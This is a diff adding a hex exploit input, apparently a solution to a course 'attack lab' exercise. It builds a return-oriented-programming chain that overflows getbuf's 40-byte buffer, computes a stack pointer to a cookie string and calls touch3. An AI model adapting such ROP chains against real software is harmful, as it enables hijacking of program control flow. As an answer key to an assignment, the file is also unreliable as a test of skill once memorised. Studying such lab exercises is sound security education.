@@ -1,0 +1,39 @@
+/* Fill getbuf()'s buffer (40 bytes) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* gadget A: movq %rsp, %rax ; retq */
+06 1a 40 00 00 00 00 00
+/* gadget B: movq %rax, %rdi ; retq */
+a2 19 40 00 00 00 00 00
+/* gadget C: popq %rax ; retq */
+cc 19 40 00 00 00 00 00
+/* string sits 152 bytes above the captured %rsp */
+98 00 00 00 00 00 00 00
+/* gadget D: movl %eax, %edx ; retq */
+dd 19 40 00 00 00 00 00
+/* gadget E: movl %edx, %ecx ; cmp %cl,%cl ; retq */
+34 1a 40 00 00 00 00 00
+/* gadget F: movl %ecx, %esi ; nop ; nop ; retq */
+13 1a 40 00 00 00 00 00
+/* add_xy: lea (%rdi,%rsi),%rax ; retq */
+d6 19 40 00 00 00 00 00
+/* gadget B again: movq %rax, %rdi ; retq */
+a2 19 40 00 00 00 00 00
+/* touch3 */
+fa 18 40 00 00 00 00 00
+/* padding up to the cookie string at offset 200 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* cookie string "59b997fa\0" */
+35 39 62 39 39 37 66 61 00
